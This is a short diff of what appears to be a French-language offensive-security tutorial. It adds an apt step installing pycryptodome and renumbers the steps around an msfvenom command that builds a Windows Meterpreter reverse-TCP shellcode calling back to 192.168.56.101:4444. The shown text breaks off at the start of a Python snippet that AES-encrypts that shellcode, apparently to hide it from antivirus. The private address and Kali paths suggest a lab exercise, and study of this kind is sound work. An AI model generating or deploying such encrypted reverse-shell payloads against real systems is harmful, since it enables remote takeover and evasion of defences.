@@ -396,9 +396,12 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 
 # Étape 1 : Générer le shellcode
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw -o /home/kali/Desktop/shellcode.bin
 ```
-
+````bash
+# Etape2 : Installer pycryptodome via APT
+apt update && apt install python3-pycryptodome -y
+```` 
 ```bash
-# Étape 2 : Chiffrer avec AES
+# Étape 3: Chiffrer avec AES
 python3 -c "
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
